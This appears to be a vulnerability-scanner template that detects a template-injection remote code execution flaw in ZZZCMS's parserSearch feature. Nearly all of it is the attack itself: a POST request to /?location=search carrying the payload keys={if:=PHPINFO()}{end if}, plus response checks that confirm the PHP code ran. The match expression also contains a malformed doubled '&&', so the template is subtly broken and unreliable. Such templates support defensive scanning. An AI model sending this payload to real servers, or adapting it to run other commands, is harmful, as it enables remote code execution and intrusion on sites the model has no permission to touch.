expression: r0()
id: zzzcms-parser-search-rce
info:
  author: daffainfo
  description: "ZZZCMS parserSearch \u5B58\u5728\u6A21\u677F\u6CE8\u5165\u5BFC\u81F4\
    \u8FDC\u7A0B\u547D\u4EE4\u6267\u884C\u6F0F\u6D1E app=\"zzzcms\""
  name: "ZZZCMS parserSearch \u8FDC\u7A0B\u547D\u4EE4\u6267\u884C\u6F0F\u6D1E"
  reference:
  - http://wiki.peiqi.tech/wiki/cms/ZZZCMS/ZZZCMS%20parserSearch%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html
  severity: critical
rules:
  r0:
    expression: response.status == 200 && && response.body.bcontains(b'PHP Extension')
      && response.body.bcontains(b'PHP Version') && r'>PHP Version <\/td><td class="v">([0-9.]+)'.bmatches(response.body)
    request:
      body: 'keys={if:=PHPINFO()}{end if}

        '
      headers:
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
        Cache-Control: no-cache
        Content-Type: text/plain
        Pragma: no-cache
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
          like Gecko) Chrome/90.0.4430.212 Safari/537.36
      method: POST
      path: /?location=search
